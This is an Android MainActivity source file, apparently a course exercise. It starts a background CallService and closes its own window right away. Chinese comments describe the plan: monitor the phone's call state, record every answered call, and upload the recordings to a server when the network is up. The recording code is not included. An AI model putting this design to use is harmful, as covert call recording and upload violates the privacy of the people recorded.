package com.m520it.service02;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
//		1.时时刻刻的监听用户当前的打电话状态--->Service
//		2.当用户开始接听电话的时候 开始录音   用户挂断了电话 停止录音---->录音 
//		3.当发现网络状态(广播 判断网络)是开着的时候  就应该发送录音到后台服务器
		Intent intent=new Intent(this,CallService.class);
		startService(intent);
		finish();
	}
	
	public void myClick(View v){
		
	}


}
